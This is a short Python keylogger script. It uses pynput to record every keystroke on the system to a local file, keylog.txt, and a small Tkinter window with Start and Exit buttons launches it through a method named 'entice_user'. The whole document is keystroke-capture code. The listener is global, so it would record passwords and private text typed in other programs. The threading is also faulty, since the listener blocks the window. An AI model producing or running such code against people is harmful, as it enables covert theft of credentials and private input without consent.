import pynput
from pynput.keyboard import Listener
import os
import time
import threading
import tkinter as tk
from tkinter import messagebox

# Class to handle keylogging
class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_data = []

    def log_key(self, key):
        try:
            key = key.char  # Get the actual character
        except AttributeError:
            key = str(key)  # Special keys (shift, ctrl, etc.)
        
        self.log_data.append(key)
        self.write_to_file()
    
    def write_to_file(self):
        with open(self.log_file, "a") as file:
            file.write("".join(self.log_data) + "\n")
        self.log_data = []  # Clear after writing

# Subclass to handle user interaction
class UserInteraction(KeyLogger):
    def __init__(self, log_file="keylog.txt"):
        super().__init__(log_file)
    
    def entice_user(self):
        self.create_ui()
    
    def start_logging(self):
        messagebox.showinfo("Information", "Start typing to test the keylogger!")
        with Listener(on_press=self.log_key) as listener:
            listener.join()

    def create_ui(self):
        root = tk.Tk()
        root.title("Keylogger")
        root.geometry("300x150")
        
        label = tk.Label(root, text="Press Start to begin logging", font=("Arial", 12))
        label.pack(pady=10)
        
        start_button = tk.Button(root, text="Start Logging", command=self.start_logging, font=("Arial", 10))
        start_button.pack()
        
        exit_button = tk.Button(root, text="Exit", command=root.quit, font=("Arial", 10))
        exit_button.pack(pady=5)
        
        root.mainloop()

# Function to run keylogger in a separate thread
def run_keylogger():
    logger = UserInteraction()
    logger.entice_user()
    thread = threading.Thread(target=logger.start_logging)
    thread.start()

# Run keylogger
if __name__ == "__main__":
    try:
        run_keylogger()
    except Exception as e:
        print(f"An error occurred: {e}")

